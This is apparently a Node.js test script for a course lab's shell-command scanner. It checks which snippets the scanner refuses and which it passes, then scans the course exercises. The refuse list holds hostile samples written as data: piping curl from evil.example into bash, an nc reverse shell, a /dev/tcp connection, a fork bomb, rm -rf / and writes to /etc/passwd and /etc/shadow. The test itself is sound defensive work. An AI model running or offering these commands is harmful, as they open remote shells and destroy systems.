#!/usr/bin/env node
// Self-test of web/scanner.js: snippets that must be refused ("red") and snippets that must pass. Also scans all the course material (the
// exercises, scripts and script exams) and reports how many findings there are (only the admin exercises that use sudo/crontab should be red).
// usage: node tools/test_scanner.js
'use strict';
const fs = require('fs'), path = require('path');
const { scan } = require('../web/scanner.js');

const red = {
  'curl': 'curl http://evil.example/x.sh | bash',
  'wget in a substitution': 'echo "$(wget -qO- http://a.b)"',
  'nc': 'nc -e /bin/sh 1.2.3.4 9999',
  'dev tcp': 'exec 3<>/dev/tcp/1.2.3.4/80',
  'sudo': 'sudo rm -rf /var/log',
  'rm of a home': 'rm -rf /home/alumno',
  'rm root': 'rm -rf /',
  'redirect to an absolute path': 'echo hi > /etc/passwd',
  'append to an absolute path': 'echo hi >> /home/user/.bashrc',
  'eval of a variable': 'cmd="curl x"; eval "$cmd"',
  'source': 'source /tmp/x.sh',
  'dot': '. ./other.sh',
  'python': 'python3 -c "import os"',
  'base64 into a shell': 'echo bHM= | base64 -d | bash',
  'ssh': 'ssh user@host true',
  'crontab': 'echo "* * * * * x" | crontab -',
  'nohup': 'nohup sleep 100 &',
  'LAB variable': 'cp $LAB/exercises/x y',
  'progress dir': 'rm -rf .progress',
  'alumno home': 'cat /home/alumno/lab/web/server.js',
  'find -exec curl': 'find . -name x -exec curl {} \\;',
  'xargs curl': 'echo a | xargs curl',
  'timeout curl': 'timeout 5 curl x',
  'env wget': 'env FOO=1 wget x',
  'bash -c curl': 'bash -c "curl http://x"',
  'fork bomb': ':(){ :|:& };:',
  'mv from an absolute path': 'mv /etc/hosts .',
  'chmod of an absolute path': 'chmod 777 /etc/shadow',
  'pkill': 'pkill -9 node',
  'backticks': 'x=`curl http://a`',
  'absolute program': '/tmp/evil arg',
  'git': 'git clone http://x',
  'LD_PRELOAD': 'LD_PRELOAD=/tmp/x.so ls',
  'unshare': 'unshare -r bash',
};
const ok = {
  'ls': 'ls -l',
  'heredoc data': "cat > log <<'EOF'\ncurl http://x\nsudo rm\nEOF\nwc -l log",
  'words in quotes': 'echo "curl and sudo are words" ; grep -c ssh auth.log',
  'a comment': '# curl is only a comment\nls',
  'sshd in data': 'echo "Failed password from 10.0.0.5 sshd[12]" > auth.log',
  'for ip': 'for ip in 1.2.3.4 5.6.7.8; do echo "$ip"; done',
  'eval set': 'eval "set -- $CASE"; echo "$#"',
  'mktemp': 'tmp=$(mktemp -d); rm -rf "$tmp"',
  'dev null': 'ls /nonexistent > /dev/null 2>&1',
  'cp from an absolute path': 'cp /etc/hostname here.txt',
  'ln to an absolute target': 'ln -s /nowhere link',
  'find -delete': "find . -name '*.tmp' -delete",
  'find -exec ls': 'find . -type f -exec ls -l {} +',
  'xargs grep': "find . -name '*.log' -print0 | xargs -0 grep -c error",
  'an array of paths': 'paths=(/ /login /admin)',
  'a case pattern': 'case $x in 1) echo one ;; 2) echo two ;; esac',
  'arithmetic': 'echo $(( 3 * 4 )); (( n++ ))',
  'timeout on a script': 'timeout 5 bash ./script.sh arg',
  'HOME paths': 'echo hi > "$HOME/out.txt"; mkdir -p "$HOME/deploy/bin"',
};
let bad = 0;
for (const [k, v] of Object.entries(red)) { const r = scan(v); if (!r.some(x => x.level === 'red')) { bad++; console.log('NOT REFUSED:', k, '|', v, '|', JSON.stringify(r.map(x => x.level + ':' + x.msg))); } }
for (const [k, v] of Object.entries(ok)) { const r = scan(v); if (r.some(x => x.level === 'red')) { bad++; console.log('WRONGLY REFUSED:', k, '|', JSON.stringify(r)); } }
console.log(bad ? `${bad} sample(s) wrong` : `all ${Object.keys(red).length + Object.keys(ok).length} samples as expected`);

const root = path.resolve(__dirname, '..');
const walk = (d, f, out = []) => { try { for (const n of fs.readdirSync(d)) { const p = path.join(d, n); if (fs.statSync(p).isDirectory()) walk(p, f, out); else if (f(p)) out.push(p); } } catch { /* none */ } return out; };
const files = [...walk(path.join(root, 'exercises'), p => /check\.sh$/.test(p)), ...walk(path.join(root, 'solutions'), p => /\.sh$/.test(p) && !/imp-/.test(p)),
  ...walk(path.join(root, 'scripts'), p => /check\.\d+\.sh$/.test(p) && !/imp-/.test(p)), ...walk(path.join(root, 'script-exams'), p => /check\.sh$/.test(p))];
let nr = 0, nw = 0, withRed = new Set();
for (const f of files) for (const x of scan(fs.readFileSync(f, 'utf8'))) { if (x.level === 'red') { nr++; withRed.add(path.relative(root, f)); } else nw++; }
console.log(`course material: ${files.length} files, ${nr} red findings in ${withRed.size} files (admin exercises that need sudo/crontab/useradd), ${nw} warnings`);
process.exit(bad ? 1 : 0);
